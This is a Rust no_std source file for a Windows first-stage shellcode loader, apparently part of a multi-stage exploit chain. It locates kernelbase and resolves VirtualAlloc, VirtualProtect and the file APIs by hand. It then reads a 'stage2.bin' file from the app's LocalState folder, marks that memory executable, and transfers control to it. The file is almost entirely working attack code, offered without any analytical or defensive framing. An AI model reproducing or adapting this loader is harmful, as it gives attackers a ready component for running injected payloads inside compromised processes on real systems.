#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]
#![allow(overflowing_literals)]
#![no_std]
#![no_main]

use core::arch::asm;
use core::mem::MaybeUninit;
use core::panic::PanicInfo;

use shellcode_utils::allocators::WinVirtualAlloc;
use shellcode_utils::prelude::*;

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}

type Stage2Fn = fn(*const ShellcodeArgs) -> u64;

const STAGE2_ENV_FILENAME: &str = concat!(r#"%LOCALAPPDATA%\..\LocalState\stage2.bin"#, "\0");
const STAGE1_ERROR_FILE_OPEN_FAILED: u64 = 0x10000001;
const STAGE1_ERROR_FILE_READ_FAILED: u64 = 0x10000002;

#[used]
#[no_mangle]
// Required because compiler_builtins expects this symbol to be present
// and they only define it for UEFI environments
pub static _fltused: i32 = 0;

#[no_mangle]
pub extern "C" fn main() -> u64 {
    unsafe { asm!("and rsp, ~0xf") };

    let kernelbase_ptr = get_kernelbase();
    if kernelbase_ptr.is_none() {
        return 0x404;
    }
    let kernelbase_ptr = kernelbase_ptr.unwrap();

    let VirtualAlloc = fetch_virtual_alloc(kernelbase_ptr);
    let VirtualProtect = fetch_virtual_protect(kernelbase_ptr);
    let ExpandEnvironmentStringsA = fetch_expand_environment_strings(kernelbase_ptr);

    #[cfg(feature = "debug")]
    let OutputDebugStringA = fetch_output_debug_string(kernelbase_ptr);

    macro_rules! debug_print {
        ($msg:expr) => {
            #[cfg(feature = "debug")]
            unsafe {
                OutputDebugStringA(concat!($msg, "\n\0").as_ptr() as _)
            }
        };
    }
    debug_print!("Hello from stage1");

    let virtual_alloc = WinVirtualAlloc::new(kernelbase_ptr);

    let mut stage2_filename: MaybeUninit<[u8; 200]> = MaybeUninit::uninit();
    unsafe {
        (ExpandEnvironmentStringsA)(
            STAGE2_ENV_FILENAME.as_ptr(),
            stage2_filename.as_mut_ptr() as *mut _,
            core::mem::size_of_val(&stage2_filename) as u32,
        );
    }

    let file_funcs = FileReaderFuncs {
        create_file: fetch_create_file(kernelbase_ptr),
        read_file: fetch_read_file(kernelbase_ptr),
        get_size: fetch_get_file_size(kernelbase_ptr),
        virtual_alloc: VirtualAlloc,
        close_handle: fetch_close_handle(kernelbase_ptr),
    };

    let stage2_reader = FileReader::open(
        stage2_filename.as_ptr() as *const _,
        &file_funcs,
        virtual_alloc,
    );
    if stage2_reader.is_err() {
        return STAGE1_ERROR_FILE_OPEN_FAILED;
    }
    let mut stage2_reader = unsafe { stage2_reader.unwrap_unchecked() };

    // Read the full stage3 PE file to memory
    let stage2_data = match stage2_reader.read_all() {
        Ok(res) => res,
        Err(FileReaderError::ReadFailed) => {
            return STAGE1_ERROR_FILE_READ_FAILED;
        }
        Err(FileReaderError::OpenFailed) => {
            // Should be impossible but we'll handle it anyways for completeness
            unreachable!();
        }
    };

    drop(stage2_reader);

    let mut old_flags = 0u32;

    // Change the stage 2 payload's permissions
    debug_print!("Changing stage2 permissions");
    unsafe {
        VirtualProtect(
            stage2_data.as_ptr() as *const _,
            stage2_data.len(),
            0x20,
            &mut old_flags as *mut _,
        )
    };

    debug_print!("Executing stage2");

    let stage2: Stage2Fn = unsafe { core::mem::transmute(stage2_data.as_ptr()) };
    stage2(core::ptr::null())
}

// #[allow(unused_attributes)]
// #[cfg(target_env = "msvc")]
// #[link_args = "/GS- /MERGE:.rdata=.text /MERGE:.pdata=.text /NODEFAULTLIB /EMITPOGOPHASEINFO /DEBUG:NONE"]
// extern "C" {}
